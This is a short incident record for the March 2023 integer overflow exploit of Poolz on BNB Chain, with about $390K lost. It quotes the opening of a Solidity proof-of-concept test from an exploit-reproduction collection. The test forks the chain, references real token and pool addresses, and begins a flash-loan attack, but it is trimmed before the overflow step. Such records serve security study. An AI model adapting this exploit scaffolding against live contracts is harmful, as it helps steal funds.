# [?] - Poolz - integer overflow

## Summary
Severity: Unknown
Chain: BNB Chain
Component: poolz
Published: 2023-03-15
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/poolz_exp.sol
Type: defi-exploit-poc

## Details
Lost: ~$390K

```solidity
contract ContractTest is Test {
    IDPPAdvanced constant dppAdvanced = IDPPAdvanced(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    WBNB constant wbnb = WBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    IERC20 constant mnz = IERC20(0x861f1E1397daD68289e8f6a09a2ebb567f1B895C);

    IERC20 constant wod = IERC20(0x298632D8EA20d321fAB1C9B473df5dBDA249B2b6);

    IERC20 constant sip = IERC20(0x9e5965d28E8D44CAE8F9b809396E0931F9Df71CA);

    IERC20 constant ecio = IERC20(0x327A3e880bF2674Ee40b6f872be2050Ed406b021);

    IERC20 constant busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    LockedDeal constant poolzpool = LockedDeal(payable(0x8BfAA473a899439d8E07BF86a8C6cE5De42fE54B));

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 26_475_403);
    }

    function testExploit() external {
        bytes memory data;
        address assetTo = address(this);
        data = "poolz";
        dppAdvanced.flashLoan(1e18, 0, assetTo, data);
    }

    function DPPFlashLoanCall(address, uint256, uint256, bytes memory data) external {
        if (keccak256(data) == keccak256("poolz")) {
            console.log("Flashloan attacks");
            emit log_named_decimal_uint("[Before mnz Exp] wbnb  balance", wbnb.balanceOf(address(this)), 18);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-03/poolz_exp.sol_
